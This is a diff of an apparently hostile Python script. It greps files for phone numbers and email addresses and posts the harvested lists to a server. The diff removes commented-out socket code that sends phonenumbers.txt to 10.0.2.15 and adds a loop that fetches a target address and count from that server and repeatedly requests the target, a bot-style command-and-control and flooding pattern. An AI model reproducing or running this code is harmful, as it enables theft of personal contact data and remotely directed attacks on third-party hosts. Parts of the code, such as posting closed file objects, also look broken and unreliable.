@@ -1,6 +1,4 @@
 import os
-from twilio.rest import TwilioRestClient
-import socket
 import smtplib
 from email.mime.text import MIMEText
 import Crypto
@@ -9,6 +7,8 @@ from Crypto import Random
 from base64 import b64decode
 import sys
 import requests
+import json
+import time
 
 grep_numbers = "grep -roh '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -]\?[0-9]\{3\}[ -]\?[0-9]\{4\}' . | sort -u > phonenumbers.txt"
 grep_emails = "grep -Eroh '\\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\\b' . | sort -u > emails.txt"
@@ -43,34 +43,13 @@ fp_numbers.close()
 fp_emails.close()
 
 r = requests.post("http://localhost:5000", data={'numbers': fp_numbers, 'emails': fp_emails})
-print(r.text) # displays the result body.
+r = requests.get('http://localhost:5000')
+r = json.loads(r.text)['result']
+ip = r['ip']
+count = r['count']
 
-# s = socket.socket()         # Create a socket object
-# host = '10.0.2.15'  
-# port = 12345                 # Reserve a port for your service.
-# s.connect((host, port))
-# print "asdf"
-# f = open('phonenumbers.txt','rb')
-# print 'Sending...'
-# l = f.read(1024)
-# while (l):
-#     print 'Sending...'
-#     s.send(l)
-#     l = f.read(1024)
-# f.close()
-# print "Done Sending"
-# s.shutdown(socket,SHUT_WR)
-# print s.recv(1024)
-# s.close                     # Close the socket when done
-
-# TCP_IP = '10.0.2.15'
-# TCP_PORT = 12345
-# BUFFER_SIZE = 1024
-# MESSAGE = "Hello, World!" 
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# print "ASDF"
-# s.connect((TCP_IP, TCP_PORT))
-# s.send(MESSAGE)
-# data = s.recv(BUFFER_SIZE)
-# s.close()
-# print "received data:", data
+if ip != '':
+	while count > 0:
+		r = requests.get(ip)
+		count -= 1
+		time.sleep(3)
